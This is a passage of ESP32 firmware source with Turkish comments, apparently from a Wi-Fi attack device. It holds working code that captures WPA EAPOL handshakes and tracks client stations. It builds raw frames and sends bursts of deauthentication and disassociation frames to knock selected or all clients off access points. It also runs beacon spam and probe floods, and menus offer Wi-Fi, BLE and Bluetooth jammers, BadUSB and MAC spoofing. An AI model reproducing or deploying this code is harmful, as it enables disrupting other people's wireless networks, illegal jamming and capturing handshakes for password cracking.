      probeList[probeCount].lastSeen = millis();
      probeList[probeCount].count    = 1;
      probeList[probeCount].wildcard = wildcard;
      probeCount++;
    } else {
      // Buffer full: replace oldest entry (MAC randomization overflow protection)
      int oldestIdx = 0;
      uint32_t oldestTime = probeList[0].lastSeen;
      for (int i = 1; i < probeCount; i++) {
        if (probeList[i].lastSeen < oldestTime) {
          oldestTime = probeList[i].lastSeen;
          oldestIdx = i;
        }
      }
      memcpy(probeList[oldestIdx].mac, srcMac, 6);
      strlcpy(probeList[oldestIdx].ssid, ssidBuf, 33);
      probeList[oldestIdx].rssi     = rssi;
      probeList[oldestIdx].lastSeen = millis();
      probeList[oldestIdx].count    = 1;
      probeList[oldestIdx].wildcard = wildcard;
    }
    return;
  }

  // Station tracking: data frames (type=2)
  if (type==2 && len>=24) {
    uint8_t toDs  = (fc1>>0)&1;
    uint8_t fromDs= (fc1>>1)&1;
    uint8_t staMac[6], apBssid[6];
    if (toDs && !fromDs) {
      memcpy(apBssid, data+4,  6); // DA=BSSID
      memcpy(staMac,  data+10, 6); // SA=STA
    } else if (!toDs && fromDs) {
      memcpy(staMac,  data+4,  6); // DA=STA
      memcpy(apBssid, data+10, 6); // SA=BSSID
    } else return;

    // Find existing station
    int found=-1;
    for (int i=0;i<staCount;i++) {
      if (memcmp(staList[i].mac, staMac,6)==0) { found=i; break; }
    }
    if (found>=0) {
      staList[found].rssi    = rssi;
      staList[found].lastSeen= millis();
      staList[found].packets++;
      memcpy(staList[found].apBssid, apBssid,6);
    } else if (staCount < MAX_STA) {
      memcpy(staList[staCount].mac,     staMac,6);
      memcpy(staList[staCount].apBssid, apBssid,6);
      staList[staCount].rssi    = rssi;
      staList[staCount].lastSeen= millis();
      staList[staCount].packets = 1;
      staList[staCount].selected= false;
      staCount++;
    }
    return;
  }

  // EAPOL handshake
  checkHandshake(data, len, rssi);
}

// ============================================================
// EAPOL / Handshake
// ============================================================
void checkHandshake(const uint8_t* data, int len, int8_t rssi) {
  if (!hsSniffActive) return;
  if (len < 36) return;
  uint8_t type = (data[0]>>2)&0x03;
  if (type != 2) return; // data frames only

  // Look for EtherType 0x888E
  int offset = 24;
  // QoS adds 2
  uint8_t fc0 = data[0];
  if ((fc0>>4)==8 || (fc0>>4)==9 || (fc0>>4)==0xA || (fc0>>4)==0xB) offset+=2;
  if (offset+8 >= len) return;

  // Skip LLC/SNAP if present
  if (data[offset]==0xAA && data[offset+1]==0xAA && data[offset+2]==0x03) {
    offset += 8; // LLC(3) + OUI(3) + EtherType(2)
  } else {
    offset += 0; // raw EtherType
  }
  if (offset+2 > len) return;

  uint16_t etherType = ((uint16_t)data[offset]<<8) | data[offset+1];
  if (etherType != 0x888E) return;

  // EAPOL key
  if (offset+5 >= len) return;
  uint8_t eapolType = data[offset+3];
  if (eapolType != 3) return; // key
  if (offset+9 >= len) return;
  uint16_t keyInfo = ((uint16_t)data[offset+5]<<8) | data[offset+6];
  bool keyType = (keyInfo & (1 << 3)) != 0; // 1 = Pairwise Key
  if (!keyType) return; // Group key'leri (GTK) yoksay

  bool install = (keyInfo & (1 << 6)) != 0;
  bool ack     = (keyInfo & (1 << 7)) != 0;
  bool mic     = (keyInfo & (1 << 8)) != 0;
  bool secure  = (keyInfo & (1 << 9)) != 0;

  uint8_t msg = 0;
  if (ack && !mic && !install && !secure) msg = 1;
  else if (!ack && mic && !install && !secure) msg = 2;
  else if (ack && mic && secure) msg = 3;
  else if (!ack && mic && !install && secure) msg = 4;
  if (msg == 0) return;

  uint8_t clientMac[6], apBssid[6];
  uint8_t toDs  = (data[1]>>0)&1;
  uint8_t fromDs= (data[1]>>1)&1;
  if (toDs && !fromDs) {
    memcpy(apBssid,  data+4,6);
    memcpy(clientMac,data+10,6);
  } else if (!toDs && fromDs) {
    memcpy(clientMac,data+4,6);
    memcpy(apBssid,  data+10,6);
  } else return;

  // Find matching AP
  char ssidBuf[33]="";
  for (int i=0;i<apCount;i++) {
    if (memcmp(apList[i].bssid, apBssid,6)==0) {
      strlcpy(ssidBuf, apList[i].ssid,33); break;
    }
  }

  // Find existing handshake record
  int found=-1;
  for (int i=0;i<hsCount;i++) {
    if (memcmp(hsList[i].bssid,apBssid,6)==0 &&
        memcmp(hsList[i].clientMac,clientMac,6)==0) {
      found=i; break;
    }
  }
  if (found<0) {
    if (hsCount>=MAX_HS) {
      // Find incomplete or oldest record to evict (never overwrite a complete 4/4 handshake if possible)
      int targetIdx = -1;
      uint32_t oldestTime = 0xFFFFFFFF;
      for (int i = 0; i < hsCount; i++) {
        if (hsList[i].step < 4) {
          if (hsList[i].timestamp < oldestTime) {
            oldestTime = hsList[i].timestamp;
            targetIdx = i;
          }
        }
      }
      if (targetIdx < 0) {
        // All handshakes complete: evict oldest complete one
        targetIdx = 0;
        for (int i = 1; i < hsCount; i++) {
          if (hsList[i].timestamp < hsList[targetIdx].timestamp) targetIdx = i;
        }
      }
      found = targetIdx;
    } else {
      found = hsCount++;
    }
    memcpy(hsList[found].bssid, apBssid,6);
    memcpy(hsList[found].clientMac, clientMac,6);
    strlcpy(hsList[found].ssid, ssidBuf,33);
    hsList[found].step=0;
  }
  if (msg > hsList[found].step) {
    hsList[found].step = msg;
    hsList[found].timestamp = millis();

  }
}

// ============================================================
// WiFi Scanner
// ============================================================
// ============================================================
// WiFi Scanner + Promiscuous PMF Detection
// ============================================================
// PMF (Protected Management Frames) gerçek tespiti:
// IEEE 802.11 RSN IE (tag 48) içindeki RSN Capabilities alanı:
//   bit 6 (MFPC): Management Frame Protection Capable
//   bit 7 (MFPR): Management Frame Protection Required
// WiFi.scanNetworks() bu IE'ye erişim sağlamaz.
// Strateji: WiFi scan sonrası, bulunan her AP'nin kanalında
// kısa promiscuous pencere aç, beacon frame yakala, RSN IE parse et.
// ============================================================

// RSN IE'den PMF capability bitlerini parse et
// frame: beacon/probe resp frame başlangıcı (802.11 header dahil)
// len: frame uzunluğu
// Dönüş: 0=PMF yok, 1=MFPC only, 2=MFPC+MFPR (zorunlu)
static uint8_t parseRsnPMF(const uint8_t* frame, int len) {
  // Beacon body: 24 byte 802.11 header + 12 byte fixed fields (ts+intv+cap)
  int pos = 36;
  if (len < pos) return 0;

  while (pos + 1 < len) {
    uint8_t tag    = frame[pos];
    uint8_t tagLen = frame[pos + 1];
    if (pos + 2 + tagLen > len) break;

    if (tag == 48 && tagLen >= 20) {  // RSN IE (tag 48), min 20 byte
      // RSN IE yapısı:
      // [0-1]  Version (2 byte, little-endian, should be 1)
      // [2-5]  Group Cipher Suite (4 byte)
      // [6-7]  Pairwise Count (2 byte)
      // [8..8+count*4-1] Pairwise Cipher Suites
      // [next] AKM Count (2 byte)
      // [next+2..] AKM Suites
      // [last-2] RSN Capabilities (2 byte) — bitmiz burası
      const uint8_t* rsn = frame + pos + 2;

      // Version kontrolü
      uint16_t ver = rsn[0] | ((uint16_t)rsn[1] << 8);
      if (ver != 1) { pos += 2 + tagLen; continue; }

      // Pairwise count
      if (tagLen < 8) { pos += 2 + tagLen; continue; }
      uint16_t pwCount = rsn[6] | ((uint16_t)rsn[7] << 8);
      int offset = 8 + pwCount * 4;
      if (offset + 2 > tagLen) { pos += 2 + tagLen; continue; }

      // AKM count
      uint16_t akmCount = rsn[offset] | ((uint16_t)rsn[offset+1] << 8);
      offset += 2 + akmCount * 4;
      if (offset + 2 > tagLen) { pos += 2 + tagLen; continue; }

      // RSN Capabilities (2 byte, little-endian)
      uint16_t caps = rsn[offset] | ((uint16_t)rsn[offset+1] << 8);
      bool mfpc = (caps & (1 << 6)) != 0;  // bit6: Management Frame Protection Capable
      bool mfpr = (caps & (1 << 7)) != 0;  // bit7: Management Frame Protection Required

      if (mfpr && mfpc) return 2;  // PMF zorunlu
      if (mfpc)         return 1;  // PMF destekleniyor ama zorunlu değil
      return 0;
    }
    pos += 2 + tagLen;
  }
  return 0;
}

// Promiscuous callback için PMF scan state
struct PMFScanState {
  uint8_t  targetBssid[6];
  uint8_t  pmfResult;   // 0=yok, 1=capable, 2=required
  bool     found;
};
static PMFScanState pmfScan;

static void IRAM_ATTR pmfPromisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  if (pmfScan.found) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* data = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;

  if (len < 38) return;

  // Sadece beacon (0x80) ve probe response (0x50) frame'leri
  uint8_t fc0 = data[0];
  if (fc0 != 0x80 && fc0 != 0x50) return;

  // BSSID: beacon'da addr3 (offset 16)
  if (memcmp(data + 16, pmfScan.targetBssid, 6) != 0) return;

  // RSN IE parse
  pmfScan.pmfResult = parseRsnPMF(data, len);
  pmfScan.found = true;
}

// Belirli bir AP'nin beacon'ını yakalayıp PMF bitini oku
// Döner: 0=PMF yok, 1=MFPC, 2=MFPR
static uint8_t detectPMF(const uint8_t* bssid, uint8_t channel, uint32_t timeoutMs) {
  memcpy(pmfScan.targetBssid, bssid, 6);
  pmfScan.pmfResult = 0;
  pmfScan.found = false;

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(pmfPromisc_cb);

  uint32_t start = millis();
  while (!pmfScan.found && (millis() - start) < timeoutMs) {
    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  return pmfScan.pmfResult;
}

void doWifiScan() {
  apCount = 0;
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks(false, true);  // async=false, show_hidden=true
  if (n <= 0) return;
  if (n > MAX_AP) n = MAX_AP;

  for (int i = 0; i < n; i++) {
    strlcpy(apList[apCount].ssid, WiFi.SSID(i).c_str(), 33);
    WiFi.BSSID(i, apList[apCount].bssid);
    apList[apCount].rssi    = WiFi.RSSI(i);
    apList[apCount].channel = WiFi.channel(i);
    apList[apCount].enc     = WiFi.encryptionType(i);
    apList[apCount].selected = false;
    apList[apCount].hidden  = (apList[apCount].ssid[0] == 0);
    if (apList[apCount].hidden) strlcpy(apList[apCount].ssid, "[Hidden]", 33);
    oui_lookup(apList[apCount].bssid, apList[apCount].vendor, 12);

    // PMF tespiti: WPA3 zaten zorunlu tutar (MFPR).
    // WPA2 için promiscuous beacon yakalama ile RSN Capabilities parse et.
    uint8_t enc = WiFi.encryptionType(i);
    if (enc == WIFI_AUTH_WPA3_PSK) {
      apList[apCount].pmf = true;  // WPA3: her zaman MFPR
    } else if (enc == WIFI_AUTH_WPA2_PSK || enc == WIFI_AUTH_WPA_WPA2_PSK ||
               enc == WIFI_AUTH_WPA2_ENTERPRISE) {
      // 120ms pencere — beacon interval genellikle 100ms, 1 beacon yakalaşır
      uint8_t pmfLevel = detectPMF(apList[apCount].bssid, apList[apCount].channel, 120);
      apList[apCount].pmf = (pmfLevel > 0);  // MFPC veya MFPR → PMF var
    } else {
      apList[apCount].pmf = false;  // OPEN/WEP/WPA: PMF yok
    }

    apCount++;
  }

  // Scan bittikten sonra STA moduna dön, promiscuous kapalı tut
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(false);
}

// ============================================================
// Raw Frame Builders
// ============================================================
bool buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint16_t reason) {
  frame[0]=0xC0; frame[1]=0x00; // FC deauth
  frame[2]=0x00; frame[3]=0x00; // Duration
  memcpy(frame+4,  da,    6);   // Addr1 DA
  memcpy(frame+10, sa,    6);   // Addr2 SA
  memcpy(frame+16, bssid, 6);   // Addr3 BSSID
  frame[22]=0x00; frame[23]=0x00; // Seq
  frame[24]=(uint8_t)(reason&0xFF);
  frame[25]=(uint8_t)(reason>>8);
  return true;
}

bool buildBeaconFrame(uint8_t* frame, int* outLen, const char* ssid, uint8_t ch, bool wpa2, const uint8_t* mac) {
  int pos=0;
  frame[pos++]=0x80; frame[pos++]=0x00; // FC beacon
  frame[pos++]=0x00; frame[pos++]=0x00; // Duration
  // DA broadcast
  for (int i=0;i<6;i++) frame[pos++]=0xFF;
  // SA = mac
  memcpy(frame+pos, mac,6); pos+=6;
  // BSSID = mac
  memcpy(frame+pos, mac,6); pos+=6;
  frame[pos++]=0x00; frame[pos++]=0x00; // Seq
  // Timestamp 8 bytes
  for (int i=0;i<8;i++) frame[pos++]=0x00;
  // Beacon interval
  frame[pos++]=0x64; frame[pos++]=0x00;
  // Capability
  frame[pos++]=0x31; frame[pos++]=0x04;
  // IE 0x00 SSID
  uint8_t ssidLen=(uint8_t)min((int)strlen(ssid),32);
  frame[pos++]=0x00; frame[pos++]=ssidLen;
  memcpy(frame+pos,ssid,ssidLen); pos+=ssidLen;
  // IE 0x01 Supported Rates
  static const uint8_t rates[]={0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  frame[pos++]=0x01; frame[pos++]=8;
  memcpy(frame+pos,rates,8); pos+=8;
  // IE 0x03 DS Parameter
  frame[pos++]=0x03; frame[pos++]=0x01; frame[pos++]=ch;
  // IE 0x05 TIM
  frame[pos++]=0x05; frame[pos++]=0x04;
  frame[pos++]=0x00; frame[pos++]=0x01; frame[pos++]=0x00; frame[pos++]=0x00;
  // RSN (WPA2)
  if (wpa2) {
    static const uint8_t rsn[]={
      0x01,0x00, // version
      0x00,0x0F,0xAC,0x04, // CCMP group
      0x01,0x00, // pairwise count
      0x00,0x0F,0xAC,0x04, // CCMP pairwise
      0x01,0x00, // AKM count
      0x00,0x0F,0xAC,0x02, // PSK
      0x0C,0x00  // RSN capabilities
    };
    frame[pos++]=0x30; frame[pos++]=sizeof(rsn);
    memcpy(frame+pos,rsn,sizeof(rsn)); pos+=sizeof(rsn);
  }
  *outLen = pos;
  return true;
}

bool buildProbeReqFrame(uint8_t* frame, int* outLen, const char* ssid, const uint8_t* sa) {
  int pos=0;
  frame[pos++]=0x40; frame[pos++]=0x00; // FC probe req
  frame[pos++]=0x00; frame[pos++]=0x00;
  for (int i=0;i<6;i++) frame[pos++]=0xFF; // DA broadcast
  memcpy(frame+pos,sa,6); pos+=6;          // SA
  for (int i=0;i<6;i++) frame[pos++]=0xFF; // BSSID broadcast
  frame[pos++]=0x00; frame[pos++]=0x00;    // Seq
  // IE SSID
  uint8_t ssidLen = ssid ? (uint8_t)min((int)strlen(ssid),32) : 0;
  frame[pos++]=0x00; frame[pos++]=ssidLen;
  if (ssidLen) { memcpy(frame+pos,ssid,ssidLen); pos+=ssidLen; }
  // IE Supported Rates
  static const uint8_t rates[]={0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  frame[pos++]=0x01; frame[pos++]=8;
  memcpy(frame+pos,rates,8); pos+=8;
  *outLen=pos;
  return true;
}

// ============================================================
// Attack Engine
// ============================================================
void sendDeauthFrames() {
  // Termal koruması
  if (thermalThrottle) return;

  // ---- AP Interface Guard ----
  // esp_wifi_80211_tx(WIFI_IF_AP, ...) yalnızca WIFI_AP veya WIFI_AP_STA modunda
  // ve softAP başlatıldıktan sonra çalışır. Mod kontrolü yaparak ESP_ERR_INVALID_ARG
  // hatası önlenir. Yanlış moddaysa hızlıca düzelt ve bekle.
  {
    wifi_mode_t cur_mode;
    if (esp_wifi_get_mode(&cur_mode) != ESP_OK ||
        (cur_mode != WIFI_MODE_AP && cur_mode != WIFI_MODE_APSTA)) {
      // AP modu aktif değil — attack başlatma kodunun bunu zaten ayarlaması lazım,
      // ama bir şekilde gelinmişse burada düzelt.
      WiFi.mode(WIFI_AP);
      WiFi.softAP("x", nullptr, currentChannel, 1);
      delay(150);
    }
  }

  uint8_t frame[26];
  static const uint8_t bcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

  // Reason kodu döngüsü
  static const uint16_t REASONS[] = {0x0001,0x0002,0x0003,0x0007,0x0008,0x000F};
  static uint8_t reasonIdx = 0;

  // TX sırasında promiscuous callback'i geçici kapat
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  static uint16_t seqNum = 0;

  for (int a = 0; a < apCount; a++) {
    if (!apList[a].selected) continue;

    // Handshake sniff aktifken kanal değiştirme kısıtlaması:
    // hsLockChannel!=0 ise sadece o kanalda olan AP'lere deauth gönder.
    // Farklı kanaldaki AP'leri bu iterasyonda atla — EAPOL kaçırılmaz.
    if (hsSniffActive && hsLockChannel != 0 &&
        apList[a].channel != hsLockChannel) continue;

    // Hedef kanala geç — AP modunda set_channel çalışır
    esp_wifi_set_channel(apList[a].channel, WIFI_SECOND_CHAN_NONE);
    delayMicroseconds(500);

    uint16_t reason = REASONS[reasonIdx];
    uint16_t reason2 = REASONS[(reasonIdx+1)%6];
    reasonIdx = (reasonIdx + 1) % 6;

    bool sentSta = false;

    // --- Seçili STA → çift yön deauth + disassoc ---
    for (int s = 0; s < staCount; s++) {
      if (!staList[s].selected) continue;
      if (memcmp(staList[s].apBssid, apList[a].bssid, 6) != 0) continue;

      for (int burst = 0; burst < 10; burst++) {
        seqNum = (seqNum + 1) & 0x0FFF;
        // AP → STA deauth
        buildDeauthFrame(frame, staList[s].mac, apList[a].bssid, apList[a].bssid, reason);
        frame[22] = (uint8_t)((seqNum << 4) & 0xF0);
        frame[23] = (uint8_t)(seqNum >> 4);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        delayMicroseconds(100);

        // AP → STA disassoc
        frame[0] = 0xA0;
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        frame[0] = 0xC0;
        delayMicroseconds(100);

        seqNum = (seqNum + 1) & 0x0FFF;
        // STA → AP deauth
        buildDeauthFrame(frame, apList[a].bssid, staList[s].mac, apList[a].bssid, reason);
        frame[22] = (uint8_t)((seqNum << 4) & 0xF0);
        frame[23] = (uint8_t)(seqNum >> 4);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        delayMicroseconds(100);
      }
      pktSent += 30;
      sentSta = true;
    }

    // --- Broadcast deauth + disassoc burst ---
    int burstCount = dualRadioActive ? (sentSta ? 3 : 8) : (sentSta ? 6 : 15);
    for (int burst = 0; burst < burstCount; burst++) {
      seqNum = (seqNum + 1) & 0x0FFF;
      buildDeauthFrame(frame, bcast, apList[a].bssid, apList[a].bssid, reason);
      frame[22] = (uint8_t)((seqNum << 4) & 0xF0);
      frame[23] = (uint8_t)(seqNum >> 4);
      esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
      delayMicroseconds(100);

      frame[0] = 0xA0;
      esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
      frame[0] = 0xC0;
      delayMicroseconds(100);

      seqNum = (seqNum + 1) & 0x0FFF;
      buildDeauthFrame(frame, bcast, apList[a].bssid, apList[a].bssid, reason2);
      frame[22] = (uint8_t)((seqNum << 4) & 0xF0);
      frame[23] = (uint8_t)(seqNum >> 4);
      esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
      delayMicroseconds(100);
    }
    pktSent += burstCount * 3;

    if (dualRadioActive || (esp01UseDeauth && esp01Active)) {
      delay(2); // Power supply stabilization & FreeRTOS WDT feed
    }

    // ESP-01 co-processor deauth — her seçili AP için UART komutu gönder
    if (esp01UseDeauth && esp01Active) {
      esp01SendDeauth(apList[a].bssid, apList[a].channel, apList[a].ssid);
    }
  }

  // Callback geri aç
  if (attackRunning || hsSniffActive) {
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  }
}

void beaconSpam() {
  static int ssidIdx = 0;
  static uint16_t beaconSeq = 0;
  if (ssidCount == 0) { ssidIdx = 0; return; }
  if (ssidIdx >= ssidCount) ssidIdx = 0;

  uint8_t mac[6]; randomMAC(mac);
  uint8_t buf[256]; int flen = 0;

  // Tüm SSID'leri bu çağrıda gönder (birer paket) — loop dışı gecikmeler
  // ssidIdx'i her tick'te ilerletmek yerine hepsini burst et
  int sent = 0;
  for (int n = 0; n < ssidCount && n < 8; n++) {
    SSIDRecord &sr = ssidList[(ssidIdx + n) % ssidCount];
    randomMAC(mac);  // Her SSID için farklı fake MAC

    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    delayMicroseconds(200);

    buildBeaconFrame(buf, &flen, sr.name, currentChannel, sr.wpa2, mac);
    if (flen <= 0) continue;

    // Sequence Control: 802.11 frame[22-23] = (seq << 4) | frag
    // seq field LSB 4 bit = frag no, üst 12 bit = seq no
    buf[22] = (uint8_t)((beaconSeq << 4) & 0xF0);   // frag=0, seq LSB nibble
    buf[23] = (uint8_t)(beaconSeq >> 4);              // seq MSB 8 bit
    beaconSeq = (beaconSeq + 1) & 0x0FFF;

    // Timestamp alanı (fixed field, byte 24-31 in beacon body = frame offset 24)
    // buildBeaconFrame'den sonra timestamp'i güncelle
    // Beacon frame: FC(2)+Dur(2)+DA(6)+SA(6)+BSSID(6)+Seq(2) = 24 byte header
    // Body başlangıcı: Timestamp(8)+Interval(2)+Capability(2)
    // → frame[24..31] = timestamp (64-bit monotonic timer)
    uint64_t tsNow = (uint64_t)esp_timer_get_time();
    memcpy(buf + 24, &tsNow, 8);

    // Burst: 3 tekrar — beacon interval genelde 100ms, burst içinde tüm tekrarlar alınır
    esp_wifi_80211_tx(WIFI_IF_AP, buf, flen, true);
    delayMicroseconds(300);
    esp_wifi_80211_tx(WIFI_IF_AP, buf, flen, true);
    delayMicroseconds(300);
    esp_wifi_80211_tx(WIFI_IF_AP, buf, flen, true);
    pktSent += 3;
    sent++;
  }
  ssidIdx = (ssidIdx + min(sent, ssidCount)) % ssidCount;
}

void probeFlood() {
  uint8_t mac[6]; randomMAC(mac);
  uint8_t buf[128]; int flen=0;
  // Use selected AP SSID if available, else wildcard
  const char* targetSSID = nullptr;
  for (int i=0;i<apCount;i++) {
    if (apList[i].selected && !apList[i].hidden) {
      targetSSID = apList[i].ssid; break;
    }
  }
  buildProbeReqFrame(buf, &flen, targetSSID, mac);
  if (flen>0) esp_wifi_80211_tx(WIFI_IF_AP, buf, flen, true);
  pktSent++;
  delayMicroseconds(500);
}

// ============================================================
// Channel Analyzer
// ============================================================
void runChannelAnalyzer() {
  uint32_t now = millis();
  if (chScanDone) return;
  if (now - chScanTimer < 300) return;
  chScanTimer = now;

  if (chScanState >= 13) {
    chScanDone = true; return;
  }
  uint8_t ch = chScanState + 1;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  // Passive scan: count unique APs on channel (deduplicate by BSSID)
  int cnt=0; int32_t rssiSum=0;
  for (int i=0; i<apCount; i++) {
    if (apList[i].channel == ch) {
      bool isDup = false;
      for (int j=0; j<i; j++) {
        if (apList[j].channel == ch && memcmp(apList[i].bssid, apList[j].bssid, 6) == 0) {
          isDup = true;
          break;
        }
      }
      if (!isDup) {
        cnt++;
        rssiSum += apList[i].rssi;
        if (cnt==1) strlcpy(chBestSSID[ch-1], apList[i].ssid,17);
      }
    }
  }
  chApCount[ch-1]  = (uint8_t)cnt;
  chAvgRssi[ch-1]  = cnt ? (int8_t)(rssiSum/cnt) : -100;
  chScanState++;
}

// ============================================================
// RSSI Tracker
// ============================================================
void updateRssiTracker() {
  int selAp=-1;
  for (int i=0;i<apCount;i++) if (apList[i].selected) { selAp=i; break; }
  if (selAp<0) return;
  uint32_t now=millis();
  if (now-rssiTimer < 100) return;
  rssiTimer=now;
  int8_t r = apList[selAp].rssi;
  rssiRing[rssiHead] = r;
  rssiHead = (rssiHead+1)%RSSI_RING;
  rssiSamples++;
}

// ============================================================
// Menu Builders
// ============================================================
void setMenu(int idx, const char* lbl, AppMode tgt, int par=0) {
  strlcpy(menuItems[idx].label, lbl, 32);
  menuItems[idx].target = tgt;
  menuItems[idx].param  = par;
}

void buildMainMenu() {
  menuCount=0;
  setMenu(menuCount++,"SCAN",        MODE_MENU,           1);
  setMenu(menuCount++,"SHOW",        MODE_MENU,           2);
  setMenu(menuCount++,"ATTACK",      MODE_ATTACK_MENU,    0);
  setMenu(menuCount++,"JAMMERS",     MODE_JAMMERS_MENU,   0);
  setMenu(menuCount++,"BLE ATTACK",  MODE_BLE_MENU,       0);
  setMenu(menuCount++,"PKT MONITOR", MODE_PACKET_MONITOR, 0);
  setMenu(menuCount++,"CH ANALYZER", MODE_CHANNEL_ANALYZER,0);
  setMenu(menuCount++,"RSSI TRACKER",MODE_RSSI_TRACKER,   0);
  setMenu(menuCount++,"DEAUTH DET.", MODE_DEAUTH_DETECTOR, 0);
  setMenu(menuCount++,"CLOCK",       MODE_CLOCK,           0);
  setMenu(menuCount++,"BAD USB",     MODE_BADUSB_MENU,     0);
  setMenu(menuCount++,"SETTINGS",    MODE_SETTINGS,        0);
  menuCursor=0; menuScroll=0;
}

void buildJammersMenu() {
  char buf[32];
  menuCount=0;
  // 1) nRF24 WiFi Jam
  uint8_t dispCh = currentChannel;
  for (int i = 0; i < apCount; i++) {
    if (apList[i].selected) { dispCh = apList[i].channel; break; }
  }
  snprintf(buf,32,"%cnRF WiFi Jam ch%d", nrfWifiJamActive?'*':' ', (int)dispCh);
  setMenu(menuCount++, buf, MODE_JAMMERS_MENU, 1);

  // 2) BLE Jam
  snprintf(buf,32,"%cBLE Jammer", bleJamming?'*':' ');
  setMenu(menuCount++, buf, MODE_JAMMERS_MENU, 2);

  // 3) BT Classic Jam
  snprintf(buf,32,"%cBT Classic Jam", btClassicJamActive?'*':' ');
  setMenu(menuCount++, buf, MODE_JAMMERS_MENU, 3);

  // 4) ALL JAMMERS (Tüm Jammer'lar Aynı Anda)
  bool allActive = (nrfWifiJamActive && bleJamming && btClassicJamActive);
  snprintf(buf,32,"%c[ ALL JAMMERS ]", allActive?'*':' ');
  setMenu(menuCount++, buf, MODE_JAMMERS_MENU, 4);

  menuCursor=0; menuScroll=0;
}

void buildScanMenu() {
  menuCount=0;
  setMenu(menuCount++,"AP+ST",   MODE_SCANNING, 0);
  setMenu(menuCount++,"AP Only", MODE_SCANNING, 1);
  setMenu(menuCount++,"ST Only", MODE_SCANNING, 2);
  menuCursor=0; menuScroll=0;
}

void handleScanMenuSelect() {
  if (menuCursor >= menuCount) return;
  int par = menuItems[menuCursor].param;
  if (par==0) scanMode=SCAN_AP_STA;
  else if (par==1) scanMode=SCAN_AP_ONLY;
  else if (par==2) scanMode=SCAN_STA_ONLY;
  changeMode(MODE_SCANNING);
}

void buildShowMenu() {
  char buf[32];
  menuCount=0;
  snprintf(buf,32,"Accesspoints %d", apCount);
  setMenu(menuCount++,buf,MODE_AP_LIST,0);
  snprintf(buf,32,"Stations     %d", staCount);
  setMenu(menuCount++,buf,MODE_STA_LIST,0);
  snprintf(buf,32,"SSIDs        %d", ssidCount);
  setMenu(menuCount++,buf,MODE_SSID_LIST,0);
  snprintf(buf,32,"Probes       %d", probeCount);
  setMenu(menuCount++,buf,MODE_PROBE_LIST,0);
  menuCursor=0; menuScroll=0;
}

void buildAttackMenu() {
  char buf[32];
  menuCount=0;
  snprintf(buf,32,"%cDEAUTH    %d/%d",
    (attackFlags&ATK_DEAUTH)?'*':' ', selectedApCount(), selectedStaCount());
  setMenu(menuCount++,buf,MODE_ATTACK_MENU,0);
  snprintf(buf,32,"%cBEACON    %d",
    (attackFlags&ATK_BEACON)?'*':' ', ssidCount);
  setMenu(menuCount++,buf,MODE_ATTACK_MENU,1);
  snprintf(buf,32,"%cPROBE FLD",
    (attackFlags&ATK_PROBE)?'*':' ');
  setMenu(menuCount++,buf,MODE_ATTACK_MENU,2);
  // nRF24 WiFi kanal jammer — seçili AP'nin kanalını göster
  {
    uint8_t dispCh = currentChannel;
    for (int i = 0; i < apCount; i++) {
      if (apList[i].selected) { dispCh = apList[i].channel; break; }
    }
    snprintf(buf,32,"%cnRF JAM ch%d",
      nrfWifiJamActive?'*':' ', (int)dispCh);
  }
  setMenu(menuCount++,buf,MODE_ATTACK_MENU,3);
  // ESP-01 co-processor deauth — gerçek deauth (libnet80211 bypass)
  snprintf(buf,32,"%cESP-01 DEAUTH%s",
    esp01UseDeauth?'*':' ',
    esp01Active?" [OK]":(esp01UseDeauth?" [NC]":""));
  setMenu(menuCount++,buf,MODE_ATTACK_MENU,4);
  setMenu(menuCount++,"HANDSHK SNIFF",MODE_HANDSHAKE_STATUS,0);
  if (attackRunning)
    setMenu(menuCount++,"[STOP]",MODE_ATTACK_MENU,10);
  else
    setMenu(menuCount++,"[START]",MODE_ATTACK_MENU,9);
  menuCursor=0; menuScroll=0;
}

void buildAPList() {
  // shown directly, no submenu
  menuCount = apCount;
  menuCursor=0; menuScroll=0;
}

void buildStationList() {
  menuCount = staCount;
  menuCursor=0; menuScroll=0;
}

void buildProbeList() {
  menuCount = probeCount;
  menuCursor=0; menuScroll=0;
}

void buildSSIDList() {
  menuCount=0;
  // SSID list items: existing + actions
  // actions at end
  setMenu(menuCount++,"[CLONE APs]",  MODE_SSID_LIST,10);
  setMenu(menuCount++,"[CLONE PROBES]",MODE_SSID_LIST,11);
  setMenu(menuCount++,"[RANDOM MODE]", MODE_SSID_LIST,12);
  for (int i=0;i<ssidCount;i++) {
    char buf[34]; snprintf(buf,34,"%c%s",ssidList[i].selected?'*':' ',ssidList[i].name);
    setMenu(menuCount++,buf,MODE_SSID_LIST,i);
  }
  menuCursor=0; menuScroll=0;
}

void buildSettingsMenu() {
  char buf[32];
  menuCount=0;
  setMenu(menuCount++,"MAC SPOOFER", MODE_MAC_SPOOFER,0);
  snprintf(buf,32,"TX Rate  %d/s",txRateOptions[txRateIdx]);
  setMenu(menuCount++,buf,MODE_TX_RATE,0);
  snprintf(buf,32,"Channel  %d",currentChannel);
  setMenu(menuCount++,buf,MODE_CHANNEL_SET,0);
  setMenu(menuCount++,"SSID List",   MODE_SSID_LIST,0);
